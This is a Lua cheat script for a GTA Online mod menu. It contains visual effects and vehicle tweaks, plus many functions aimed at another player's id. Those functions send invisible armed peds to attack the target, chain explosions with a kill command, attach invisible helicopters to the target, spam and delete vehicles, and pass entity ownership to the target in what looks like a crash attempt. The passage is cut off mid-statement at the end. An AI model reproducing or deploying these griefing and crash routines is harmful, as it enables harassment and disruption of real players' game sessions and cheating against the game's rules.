function idoulh(pid)
    local pos <const> = players.get_position(pid)
    pos.z = pos.z + 10
    request_model(util.joaat("u_m_y_rsranger_01"))
    local ranger <const> = entities.create_ped(-1, util.joaat("u_m_y_rsranger_01"), pos, 0)
    ENTITY.SET_ENTITY_COLLISION(ranger, true)
    local time <const> = util.current_time_millis() + 5000
    while time > util.current_time_millis() do
        local pos <const> = players.get_position(pid)
        pos.z = pos.z + 10
        TASK.TASK_SWEEP_AIM_POSITION(ranger, "anim@mp_player_intupperstinker", "", "", "", -1, 0.0, 0.0, 0.0, 0.0, 0.0)
        TASK.TASK_SWEEP_AIM_ENTITY(ranger, "anim@mp_player_intupperstinker", "", "", "", -1, ranger, 0.0, 0.0)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ranger, pos.x, pos.y, pos.z)
        entities.give_control(ranger, pid)
        if entities.get_owner(ranger) == pid then
        wait(1000)
        entities.delete_by_handle(ranger)
        return
        end
        wait()
    end
end
function idouli(pid)
    local weapon_ped <const> = entities.create_ped(-1, util.joaat("A_C_Rat"), players.get_position(pid), 0, false, false, false, false, true)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(weapon_ped), false)
    ENTITY.SET_ENTITY_INVINCIBLE(weapon_ped, false)
    ENTITY.SET_ENTITY_VISIBLE(weapon_ped, false)
    ENTITY.FREEZE_ENTITY_POSITION(weapon_ped, false)
    ENTITY.SET_ENTITY_COLLISION(weapon_ped, true)
    WEAPON.GIVE_WEAPON_TO_PED(weapon_ped, util.joaat("WEAPON_GRENADE"), 1, true, true)
    local pos <const> = players.get_position(pid)
    TASK.TASK_THROW_PROJECTILE(weapon_ped, pos.x, pos.y, pos.z, 0, false)
    wait(1000)
    entities.delete_by_handle(weapon_ped)
end
function idoulj(pid)
    local pos <const> = players.get_position(pid)
    pos.z = pos.z + 10
    local A_C_Rat <const> = entities.create_ped(-1, util.joaat("A_C_Rat"), pos, 0)
    local BMX <const> = entities.create_vehicle(util.joaat("thruster"), pos, 0)
    local time <const> = util.current_time_millis() + 2500
        while time > util.current_time_millis() do
            ENTITY.FREEZE_ENTITY_POSITION(A_C_Rat, false)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(A_C_Rat), false)
            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(BMX), false)
            PED.SET_PED_INTO_VEHICLE(A_C_Rat, BMX, -1)
            ENTITY.SET_ENTITY_HEALTH(A_C_Rat, 0, 0)
            TASK.TASK_LEAVE_VEHICLE(A_C_Rat, BMX, 0)
            wait(100)
            ENTITY.SET_ENTITY_HEALTH(A_C_Rat, 0, 100.0)
        end
    entities.delete_by_handle(A_C_Rat)
    entities.delete_by_handle(BMX)
end
--
function gameplay_cam_track(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, 
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            players.user_ped(), 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end
function raycast_gameplay_cam(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, 
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            players.user_ped(), 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end
function Whale_gun()
    local dictionary = "scr_oddjobtraffickingair"
    local ptfx_name = "scr_ojdg4_water_exp"
    local raycast = raycast_gameplay_cam(511, 1000)[2]
    if PED.IS_PED_SHOOTING(players.user_ped()) then
        request_model(0x471BE4B2)
        local start_z = raycast.z - 10
        local Whale_hash = CreatePed(1, 0x471BE4B2, raycast, 0)
        ENTITY.FREEZE_ENTITY_POSITION(Whale_hash, true)
        ENTITY.SET_ENTITY_ROTATION(Whale_hash, 90, 0, 0, 0)
        ENTITY.SET_ENTITY_COLLISION(Whale_hash, true)
        request_ptfx_asset(dictionary)
        GRAPHICS.USE_PARTICLE_FX_ASSET(dictionary)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(ptfx_name, raycast.x, raycast.y, raycast.z, 0, 0, 0, 1, 0, 0, 0, false)
        FIRE.ADD_EXPLOSION(raycast.x,raycast.y,raycast.z, 13,1, true, false,0, true)
        for i = 1, 50 do
            ENTITY.SET_ENTITY_COORDS(Whale_hash, raycast.x, raycast.y, start_z + i * 0.3, false, false, false, true)
            wait(1)
        end
        wait(1000)
        entities.delete_by_handle(Whale_hash)
    end
end
--
function lovemea(pid)
    local tb = {}
    local model = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
    local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
    local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
    ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
    for i = 1, 3, 1 do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
        for spawn, value in pairs(model) do
            local vels = {}
            vels[spawn] = spawn_vehicle(value, BAD_attach, 0)
            for attach, value in pairs(vels) do
                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
            end
        end
        wait(500)
        FIRE.ADD_EXPLOSION(BAD_attach.x,BAD_attach.y,BAD_attach.z, 0,1, true, false,0, true)
        local count = 0
        for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
            entities.delete_by_handle(ent)
            count = count + 1
            wait()
        end
    end
end
function lovemec(pid)
    local r3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local r4 = ENTITY.GET_ENTITY_COORDS(r3)
    wait(200)
    local r5 = spawn_vehicle(3078201489, r4, 0)
        ENTITY.SET_ENTITY_VISIBLE(r5, false)
    for r = 1, 4, 1 do
        local rar = entities.get_all_vehicles_as_handles()
        for ra, rb in pairs(rar) do
          NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(rb), 0, true)
        wait()
        end
        for ra, rb in pairs(rar) do
            TASK.TASK_VEHICLE_TEMP_ACTION(r3, rb, 15, 9999)
            TASK.TASK_VEHICLE_TEMP_ACTION(r3, rb, 16, 9999)
            TASK.TASK_VEHICLE_TEMP_ACTION(r3, rb, 17, 9999)
            TASK.TASK_VEHICLE_TEMP_ACTION(r3, rb, 18, 9999)
        wait()
        end
        wait(2000)
        end
        entities.delete_by_handle(r5)
end
function lovemeb(pid)
    local tb = {}
        for t = 3, 10, 1 do
            tb[t] = CreatePed(26, 3529955798, 
            ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)), 0)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(tb[t], 
            util.joaat("weapon_hominglauncher"), 1, true)
            PED.SET_PED_COMBAT_ABILITY(tb[t], 2)
            PED.SET_PED_COMBAT_RANGE(tb[t], 50)
            PED.SET_PED_COMBAT_ATTRIBUTES(tb[t], 5, true)
            TASK.TASK_COMBAT_PED(tb[t], PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 1, 16)
            PED.SET_PED_RELATIONSHIP_GROUP_HASH(tb[t], util.joaat("weapon_hominglauncher"))
            ENTITY.SET_ENTITY_VISIBLE(tb[t], false)
            wait(20)
        end
        wait(5000)
    for r, tr in pairs(tb) do
        entities.delete_by_handle(tr)
    end
end
function cuowufujia(pid)
    pidid = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    pidpos = ENTITY.GET_ENTITY_COORDS(pidid)
    cargobob4 = spawn_vehicle(util.joaat("cargobob"), pidpos, 0)
    cargobob3 = spawn_vehicle(util.joaat("cargobob"), pidpos, 0)
    cargobob = spawn_vehicle(util.joaat("cargobob"), pidpos, 0)
    cargobob2 = spawn_vehicle(util.joaat("cargobob"), pidpos, 0)
    cargobob1 = spawn_vehicle(util.joaat("cargobob"), pidpos, 0)
    handler = spawn_vehicle(util.joaat("cargobob"), pidpos, 0)
    ENTITY.SET_ENTITY_VISIBLE(cargobob4,false)
    ENTITY.SET_ENTITY_VISIBLE(cargobob3,false)
    ENTITY.SET_ENTITY_VISIBLE(cargobob,false)
    ENTITY.SET_ENTITY_VISIBLE(cargobob2,false)
    ENTITY.SET_ENTITY_VISIBLE(cargobob1,false)
    ENTITY.SET_ENTITY_VISIBLE(handler,false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob, cargobob3, 0, 0, 0, 0.2, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob1, cargobob3, 0, 0, 0, -0.2, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(handler, cargobob3, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob4, cargobob3, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob2, cargobob4, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cargobob3, pidid, 0, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
end
function lovetop(pid)
    local pidd,pidc,chop,chup,achop = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid),
    ENTITY.GET_ENTITY_COORDS(pidd),util.joaat('S_M_M_Janitor'),util.joaat('A_C_Rat')
        request_model(chop)
        request_model(chup)
    local achop = CreatePed(26, chop, pidc, 0)
        ENTITY.SET_ENTITY_VISIBLE(achop,false)
            cuowufujia(pid)
                WEAPON.GIVE_WEAPON_TO_PED(achop, util.joaat('weapon_hominglauncher'), 9999, false, false)
                TASK.TASK_COMBAT_PED(achop, pidd, 0, 16)
                PED.SET_PED_COMBAT_ATTRIBUTES(achop, 46, true)
            PED.SET_PED_COMBAT_RANGE(achop, 4)
        PED.SET_PED_COMBAT_ABILITY(achop, 3)
    local bchop = CreatePed(26, chop, pidc, 0)
        ENTITY.SET_ENTITY_VISIBLE(bchop,false)
            WEAPON.GIVE_WEAPON_TO_PED(bchop, util.joaat('weapon_rpg'), 9999, false, false)
                TASK.TASK_COMBAT_PED(bchop, pidd, 0, 16)
                PED.SET_PED_COMBAT_ATTRIBUTES(achop, 46, true)
            PED.SET_PED_COMBAT_RANGE(achop, 4)
        PED.SET_PED_COMBAT_ABILITY(achop, 3)
    local cchop = CreatePed(26, chup, pidc, 0)
        WEAPON.GIVE_WEAPON_TO_PED(cchop, util.joaat('weapon_mg'), 9999, false, false)
            TASK.TASK_COMBAT_PED(cchop, pidd, 0, 16)
                PED.SET_PED_COMBAT_ATTRIBUTES(achop, 46, true)
                    PED.SET_PED_COMBAT_RANGE(achop, 4)
                PED.SET_PED_COMBAT_ABILITY(achop, 3) wait(1700) lovemeb(pid) wait(10000)
            entities.delete_by_handle(bchop)
        entities.delete_by_handle(achop)
    entities.delete_by_handle(cchop)
end
function jingyuchiren(pid)
    local player_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
    local pedp = players.user_ped(pid)
    local NPC = CreatePed(26, 0x471BE4B2, player_pos, 0)
    ENTITY.FREEZE_ENTITY_POSITION(NPC, true)
    ENTITY.SET_ENTITY_ROTATION(NPC, 90, 0, 0, 0)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(NPC, 
    util.joaat("weapon_hominglauncher"), 1, true)
    PED.SET_PED_COMBAT_ABILITY(NPC, 2)
    PED.SET_PED_COMBAT_RANGE(NPC, 50)
    PED.SET_PED_COMBAT_ATTRIBUTES(NPC, 5, true)
    TASK.TASK_COMBAT_PED(NPC, PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 1, 16)
    PED.SET_PED_RELATIONSHIP_GROUP_HASH(NPC, util.joaat("HATES_PLAYER"))
    local explosions = {
        {type = 4, offset = 0, damage_scale = 0, is_audible = false, is_invisible = false, camera_shake = 1.0, owner = pedp},
        {type = 0, offset = 0, damage_scale = 1, is_audible = true, is_invisible = false, camera_shake = 1, owner = false},
        {type = 70, offset = -1, damage_scale = 1, is_audible = true, is_invisible = false, camera_shake = 1, owner = false},
        {type = 38, offset = -1, damage_scale = 1, is_audible = true, is_invisible = false, camera_shake = 1, owner = false},
        {type = 12, offset = -1, damage_scale = 1, is_audible = true, is_invisible = false, camera_shake = 1, owner = false},
        {type = 13, offset = -1, damage_scale = 1, is_audible = true, is_invisible = false, camera_shake = 1, owner = false},
        {type = 20, offset = -1, damage_scale = 1, is_audible = true, is_invisible = false, camera_shake = 0, owner = false},
        {type = 23, offset = 0, damage_scale = 100.0, is_audible = true, is_invisible = false, camera_shake = 0.0, owner = false},
        {type = 45, offset = 0, damage_scale = 100.0, is_audible = true, is_invisible = false, camera_shake = 0.0, owner = false},
        {type = 26, offset = 0, damage_scale = 100.0, is_audible = true, is_invisible = false, camera_shake = 0.0, owner = false},
        {type = 6, offset = 0, damage_scale = 100.0, is_audible = true, is_invisible = false, camera_shake = 0.0, owner = false},
        {type = 24, offset = 0, damage_scale = 100.0, is_audible = true, is_invisible = false, camera_shake = 0.0, owner = false},
        {type = 38, offset = -1, damage_scale = 1, is_audible = true, is_invisible = false, camera_shake = 1, owner = false},
    }
    for _, explosion in ipairs(explosions) do
        FIRE.ADD_EXPLOSION(
            player_pos.x, 
            player_pos.y, 
            player_pos.z + explosion.offset, 
            explosion.type, 
            explosion.damage_scale, 
            explosion.is_audible, 
            explosion.is_invisible, 
            explosion.camera_shake, 
            explosion.owner
        )
    end
    menu.trigger_commands("kill" .. players.get_name(pid))
    wait(2000)
    entities.delete_by_handle(NPC)
end
function lovemed(pid)
    local pos  = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) pos.z = pos.z + 50
    local allvehs = entities.get_all_vehicles_as_handles()
        local model_array = {184361638,3186376089,410882957,1077420264,240201337}
        local spawn_veh = {}
        for spawn_, vels in pairs(model_array) do
            for i = 1, 15, 1 do
                spawn_veh[spawn_] = spawn_vehicle(vels,pos,0)
                ENTITY.FREEZE_ENTITY_POSITION(spawn_veh[spawn_],true)
                wait(0)
            end
        end
    wait(10000)
    for delete, value in pairs(allvehs) do
        entities.delete_by_handle(value)
        wait(0)
    end
end
--
function getMaxMods(veh, modSlot) -- 获取最大修改槽位
    if (VEHICLE.GET_NUM_VEHICLE_MODS(veh, modSlot) > 1) then
    return VEHICLE.GET_NUM_VEHICLE_MODS(veh, modSlot)-1 end
    return 0
end 
function QuickSetup() -- 车辆最大化
	local playerExists = ENTITY.DOES_ENTITY_EXIST(my_pid()) -- 检查实体是否有效
	if (playerExists) then
		if (PED.IS_PED_IN_ANY_VEHICLE(my_pid(), false)) then -- 检查是否在车里
			local veh = PED.GET_VEHICLE_PED_IS_IN(my_pid(), true) -- 获取车辆
			if (PAD.IS_CONTROL_JUST_RELEASED(38, 38)) then  -- E键
				VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
				VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, 'SP4C3M4N') -- 车牌
				i = 0
					while i < 17 do
				VEHICLE.SET_VEHICLE_MOD(veh, i, getMaxMods(veh, i), true)
					i = i + 1
				end  
				VEHICLE.SET_VEHICLE_MOD(veh, 14, 0, true) -- 设置车辆模型.
				VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 5) -- 将印版设置为黑色和黄色文字.
				VEHICLE.TOGGLE_VEHICLE_MOD(veh, 18, true) -- 开启涡轮.
				VEHICLE.SET_VEHICLE_COLOURS(veh, 0, 0) -- 底色清晰.
				VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(veh, 0, 0, 0) -- 车辆原色.
				VEHICLE.SET_VEHICLE_MOD_COLOR_2(veh, 5, 0) -- 车辆副色.
				VEHICLE.SET_VEHICLE_EXTRA_COLOURS(veh, 64, 111) -- 车辆珍珠色.
				VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 2) -- 添加窗口色调.
				VEHICLE.TOGGLE_VEHICLE_MOD(veh, 22, true) -- 开启氙灯.
				VEHICLE.SET_VEHICLE_MOD(veh, 23, 11, false) -- 设置所有车轮为汽车，前轮为自行车.
				VEHICLE.SET_VEHICLE_MOD(veh, 24, 11, false) -- 设置后轮(仅限摩托车)
				VEHICLE.SET_VEHICLE_WHEEL_TYPE(veh, 120) -- 轮胎类型.
				VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 3) -- 设置色调量，值越高越暗.
				VEHICLE.TOGGLE_VEHICLE_MOD(veh, 20, true) -- 使轮胎冒烟.
				VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(veh, 0, 0, 0) -- 轮胎烟色 
				VEHICLE.LOWER_CONVERTIBLE_ROOF(veh, true) -- 降低可转换车顶.
				VEHICLE.SET_VEHICLE_IS_STOLEN(veh, false) -- 这辆车不再是赃物了.
				VEHICLE.SET_VEHICLE_IS_WANTED(veh, false) -- 警方不再通缉这辆车了.
				VEHICLE.SET_VEHICLE_HAS_BEEN_OWNED_BY_PLAYER(veh, true) -- 实验.
				VEHICLE.SET_VEHICLE_NEEDS_TO_BE_HOTWIRED(veh, false) -- 车辆不再需要热线.
				VEHICLE.SET_CAN_RESPRAY_VEHICLE(veh, true) -- 车辆现在可以重新喷漆了.
				VEHICLE.SET_PLAYERS_LAST_VEHICLE(veh) -- 实验.
				VEHICLE.SET_VEHICLE_FIXED(veh) -- 修理汽车.
				VEHICLE.SET_VEHICLE_DEFORMATION_FIXED(veh) -- 修复变形.
				VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false) -- 轮胎不再爆裂.
				VEHICLE.SET_VEHICLE_WHEELS_CAN_BREAK(veh, false) -- 轮子不能再坏了.
				VEHICLE.SET_VEHICLE_CAN_BE_TARGETTED(veh, false) -- 实验.
				VEHICLE.SET_VEHICLE_EXPLODES_ON_HIGH_EXPLOSION_DAMAGE(veh, false) -- 实验.
				VEHICLE.SET_VEHICLE_HAS_STRONG_AXLES(veh, true) -- 车轴设置得很结实.
				VEHICLE.SET_VEHICLE_DIRT_LEVEL(veh, 0) -- Remove dirt.
				VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(veh, false) -- 车辆设置得非常坚固.
				VEHICLE.IS_VEHICLE_DRIVEABLE(veh, true) -- 损毁严重的车辆.
				VEHICLE.SET_VEHICLE_ENGINE_ON(veh, true, true) -- 启动发动机.
				VEHICLE.SET_VEHICLE_STRONG(veh, true) -- 车辆设置得非常坚固.
				VEHICLE.ROLL_DOWN_WINDOW(veh, 0) -- 将车辆前车窗摇下.
				VEHICLE.ROLL_DOWN_WINDOW(veh, 1)
				VEHICLE.SET_VEHICLE_NEON_ENABLED(veh, 0, true) -- 打开霓虹灯1至 4.
				VEHICLE.SET_VEHICLE_NEON_ENABLED(veh, 1, true)
				VEHICLE.SET_VEHICLE_NEON_ENABLED(veh, 2, true)
				VEHICLE.SET_VEHICLE_NEON_ENABLED(veh, 3, true)
				VEHICLE.SET_VEHICLE_NEON_ENABLED(veh, 0, 0, 255) -- 霓虹灯色.
			end
		end
	end
end
-- 操控能力
ForceMod = {}
Force = 0.5	
KeyPressed = false
KeyTimer = 0
KeyDelay = 15
ForceEnabled = false
StartedAnimWait = false
StartPush = false
PushDelay = 0
RagCount = 0
function ForceMod.Walkable_Animation(Wanted_CoreAnim, Wanted_anim)
	local pid = PLAYER.PLAYER_PED_ID()
	STREAMING.REQUEST_ANIM_DICT(Wanted_CoreAnim)
	while (not STREAMING.HAS_ANIM_DICT_LOADED(Wanted_CoreAnim)) do wait(50) end
	TASK.TASK_PLAY_ANIM(pid,Wanted_CoreAnim, Wanted_anim, 2.0, -2.0, -1, 49, 0, true, true, false)
end
function ForceMod.Fix_Animation(Wanted_CoreAnim, Wanted_anim)
	local pid = PLAYER.PLAYER_PED_ID()
	STREAMING.REQUEST_ANIM_DICT(Wanted_CoreAnim)
	while (not STREAMING.HAS_ANIM_DICT_LOADED(Wanted_CoreAnim)) do wait(50) end
	TASK.TASK_PLAY_ANIM(pid,Wanted_CoreAnim, Wanted_anim, 10.0, -2.0, -1, 52, 0, true, true, false)
end
function ForceModtick()
	if (KeyPressed) then
		KeyTimer = KeyTimer + 1
		if(KeyTimer >= KeyDelay) then
			KeyTimer = 0
			KeyPressed = false
		end
	end
	if(PAD.IS_CONTROL_JUST_RELEASED(38, 38))then
		KeyPressed = true
		ForceEnabled = true
		if (ForceEnabled) then
			Ragdolled = false
			AUDIO.PLAY_SOUND_FRONTEND(-1, "FocusOut", "HintCamSounds", true)
			ForceMod.Walkable_Animation("amb@world_human_aa_coffee@base", "base")
		else
			Ragdolled = false
			local mypid = players.user_ped()
			TASK.CLEAR_PED_TASKS(mypid)	
		end
	end
	if (StartedAnimWait) then
		PAD.SET_CONTROL_SHAKE(2, 1000, PushDelay*2)
		PushDelay = PushDelay + 1
		if (PushDelay >= 60) then
			PushDelay = 0
			StartedAnimWait = false	
			StartPush = true
			ForceEnabled = false
		end
	end
	if (StartPush) then
		StartPush = false
		local mypid = players.user_ped()
		AUDIO.PLAY_SOUND_FRONTEND(-1, "FocusOut", "HintCamSounds", true)
		wait(1000)
		TASK.CLEAR_PED_TASKS(mypid)	
		AUDIO.PLAY_SOUND_FRONTEND(-1, "FocusOut", "HintCamSounds", true)
		local vec = ENTITY.GET_ENTITY_FORWARD_VECTOR(mypid)	
		local loc = ENTITY.GET_ENTITY_COORDS(mypid, nil)		
		local CamRot = CAM.GET_GAMEPLAY_CAM_ROT(2)
		local force = 5
		local Fx = -( math.sin(math.rad(CamRot.z)) * force*10 )
		local Fy = ( math.cos(math.rad(CamRot.z)) * force*10 )
		local Fz = force * (CamRot.x*0.2)
		local PlayerVeh = PED.GET_VEHICLE_PED_IS_IN(mypid, false)		
		local PedList,CountPed = get_ped_nearby_peds(mypid)	
		local VehList,CountVeh = get_ped_nearby_vehicles(mypid, 1)
		for k in ipairs(VehList) do
			ENTITY.SET_ENTITY_INVINCIBLE(VehList[k], false)	
			if (ENTITY.IS_ENTITY_ON_SCREEN(VehList[k])) then
				if(VehList[k] ~= PlayerVeh) then
					ENTITY.APPLY_FORCE_TO_ENTITY(VehList[k], 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)			
				end
			end
		end
		for k in ipairs(PedList) do
			if (ENTITY.IS_ENTITY_ON_SCREEN(PedList[k])) then
				ENTITY.APPLY_FORCE_TO_ENTITY(PedList[k], 1, Fx, Fy,Fz, 0,0,0, true, false, true, true, true, true)
			end
		end
	end	
	if(util.is_key_down(0x58))then
		KeyPressed = true		
		StartedAnimWait = true
		local mypid = players.user_ped()		
		local PlayerVeh = PED.GET_VEHICLE_PED_IS_IN(mypid, false)
		if(PlayerVeh == 0) then
			local CamRot = CAM.GET_GAMEPLAY_CAM_ROT(2)
			ENTITY.SET_ENTITY_HEADING(mypid,CamRot.z)
			TASK.CLEAR_PED_TASKS(mypid)	
			ForceMod.Fix_Animation("anim@mp_player_intcelebrationmale@thumbs_up", "thumbs_up")
		end
	end	
	if (ForceEnabled) then
		if not StartedAnimWait then
			PAD.SET_CONTROL_SHAKE(0, 10, 10)
		end
		local mypid = players.user_ped()
		local vec = ENTITY.GET_ENTITY_FORWARD_VECTOR(mypid)	
		local loc = ENTITY.GET_ENTITY_COORDS(mypid, nil)	
		local CamRot = CAM.GET_GAMEPLAY_CAM_ROT(2)
		local PlayerVeh = PED.GET_VEHICLE_PED_IS_IN(mypid, false)
		CamRot.x = ((CamRot.x + 90) * 0.08) - 2
		CamRot.x = CamRot.x * CamRot.x
		local Markerloc = loc
		local High = (CamRot.x-20)*0.1
		if (High < -0.5) then High = -0.5 end
		Markerloc.x = loc.x - ( math.sin(math.rad(CamRot.z)) * 20 )
		Markerloc.y = loc.y + ( math.cos(math.rad(CamRot.z)) * 20 )
		Markerloc.z = loc.z
		local PedList,CountPed = get_ped_nearby_peds(mypid)	
		local VehList,CountVeh = get_ped_nearby_vehicles(mypid)	
		for k in ipairs(VehList) do
			ENTITY.SET_ENTITY_INVINCIBLE(VehList[k], true)			
			if(VehList[k] ~= PlayerVeh) then
			if (ENTITY.IS_ENTITY_ON_SCREEN(VehList[k])) then
				local Vehloc = ENTITY.GET_ENTITY_COORDS(VehList[k], nil)	
				local distance = MISC.GET_DISTANCE_BETWEEN_COORDS(Markerloc.x, Markerloc.y, Markerloc.z, Vehloc.x, Vehloc.y, Vehloc.z, true)
				local distX = Markerloc.x - Vehloc.x
				local distY = Markerloc.y - Vehloc.y
				local distZ = Markerloc.z - Vehloc.z
				local Velocity = ENTITY.GET_ENTITY_VELOCITY(VehList[k])	
				local Pspeed = ENTITY.GET_ENTITY_SPEED(mypid)				
				local ForceX = -Velocity.x*0.01 + distX/(distance*5)*((0.1*Pspeed)+1)
				local ForceY = -Velocity.y*0.01 + distY/(distance*5)*((0.1*Pspeed)+1)
				local ForceZ = High + Force - Velocity.z + distZ/(distance*5)*((0.1*Pspeed)+1)
				ENTITY.APPLY_FORCE_TO_ENTITY(VehList[k], 1, ForceX, ForceY, ForceZ, 0,0,0, true, false, true, true, true, true)
			end
			end
		end
		for k in ipairs(PedList) do
			if (ENTITY.IS_ENTITY_ON_SCREEN(PedList[k])) then
				if (PED.IS_PED_RAGDOLL(PedList[k])) then
					local Pedloc = ENTITY.GET_ENTITY_COORDS(PedList[k], nil)	
					local distance = MISC.GET_DISTANCE_BETWEEN_COORDS(Markerloc.x, Markerloc.y, Markerloc.z, Pedloc.x, Pedloc.y, Pedloc.z, true)
					local distX = Markerloc.x - Pedloc.x
					local distY = Markerloc.y - Pedloc.y
					local distZ = Markerloc.z - Pedloc.z
					local Velocity = ENTITY.GET_ENTITY_VELOCITY(PedList[k])	
					local Pspeed = ENTITY.GET_ENTITY_SPEED(pid)	
					local ForceX = -Velocity.x*0.01 + distX/(distance*5)
					local ForceY = -Velocity.y*0.01 + distY/(distance*5)
					local ForceZ = High + Force - Velocity.z + distZ/(distance*5)*((0.1*Pspeed)+1)
					ENTITY.APPLY_FORCE_TO_ENTITY(PedList[k], 1, ForceX, ForceY, ForceZ, 0,0,0, true, false, true, true, true, true)end
			end
		end		
		if (not Ragdolled) then
			for k in ipairs(PedList) do
				PED.SET_PED_TO_RAGDOLL(PedList[k], 4000, 5000, 1, true, true, true)
			end		
			Ragdolled = true
		end
		RagCount = RagCount + 1
		if (RagCount > 200) then
			RagCount = 0
			Ragdolled = false	
		end
	end
end
function aoyimishu(ayms)
    ay = ayms
        if ay then
            util.create_tick_handler(function()
            for i = 1, 16 do
                local pos = players.get_position(players.user())
                local rad = 2 * math.pi
                rad = rad / 16
                rad = rad * i
                pos.x = pos.x + (18 * math.cos(rad))
                pos.y = pos.y + (18 * math.sin(rad))
                pos.z = pos.z + 0.5
                request_ptfx_asset("scr_sum2_hal")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sum2_hal_rider_weak_blue",
                pos.x,pos.y, pos.z, 0, 0, 0, 4, false,false, false)
                wait(0)
            end
            local player_pos = players.get_position(players.user())
                request_ptfx_asset("scr_sum2_hal")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sum2_hal_rider_weak_blue",
                player_pos.x,player_pos.y, player_pos.z, 0, 0, 0,2, false, false, false)
            local player_pos = players.get_position(players.user())
            request_ptfx_asset("scr_sum2_hal")
                GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
                GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_sum2_hal_rider_weak_green", 
